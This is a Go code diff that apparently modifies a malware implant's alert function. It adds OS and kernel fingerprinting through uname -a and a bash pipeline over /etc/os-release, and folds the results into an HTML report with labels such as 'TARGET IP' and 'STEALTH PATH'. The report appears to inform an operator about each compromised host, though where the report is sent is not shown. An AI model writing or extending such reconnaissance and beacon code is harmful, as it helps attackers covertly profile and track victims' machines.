@@ -20,9 +20,20 @@ func GetKernelVersion() string {
 	if runtime.GOOS == "windows" {
 		return "Windows"
 	}
-	out, err := exec.Command("uname", "-r").Output()
+	out, err := exec.Command("uname", "-a").Output()
 	if err != nil {
 		return "Unknown"
+	}
+	return strings.TrimSpace(string(out))
+}
+
+func GetOSInfo() string {
+	if runtime.GOOS == "windows" {
+		return "Windows"
+	}
+	out, err := exec.Command("bash", "-c", "cat /etc/os-release | grep 'PRETTY_NAME' | cut -d= -f2 | tr -d '\"'").Output()
+	if err != nil {
+		return "Linux Generic"
 	}
 	return strings.TrimSpace(string(out))
 }
@@ -34,6 +45,7 @@ type AlertData struct {
 	User          string
 	Hostname      string
 	KernelVer     string
+	OSInfo        string
 	ActionDetails string
 	StealthPath   string
 	PID           int
@@ -48,6 +60,10 @@ func SendAlert(event AlertData) error {
 		event.KernelVer = GetKernelVersion()
 	}
 
+	if event.OSInfo == "" {
+		event.OSInfo = GetOSInfo()
+	}
+
 	if event.Arch == "" {
 		event.Arch = runtime.GOARCH
 	}
@@ -55,11 +71,11 @@ func SendAlert(event AlertData) error {
 	payload := fmt.Sprintf(
 		"<b>SYSTEM ALERT: [%s]</b><br>"+
 			"<b>TARGET IP    :</b> <code>%s</code><br>"+
-			"<b>USER         :</b> <code>%s</code><br>"+
-			"<b>KERNEL VER   :</b> <code>%s</code><br>"+
+			"<b>OS           :</b> <code>%s</code><br>"+
+			"<b>KERNEL       :</b> <code>%s</code><br>"+
 			"<b>STEALTH PATH :</b> <code>%s</code><br>"+
 			"<b>TIMESTAMP    :</b> %s",
-		event.Type, event.IP, event.User, event.KernelVer, event.StealthPath,
+		event.Type, event.IP, event.OSInfo, event.KernelVer, event.StealthPath,
 		time.Now().UTC().Format("2006-01-02 15:04:05 UTC"),
 	)
 
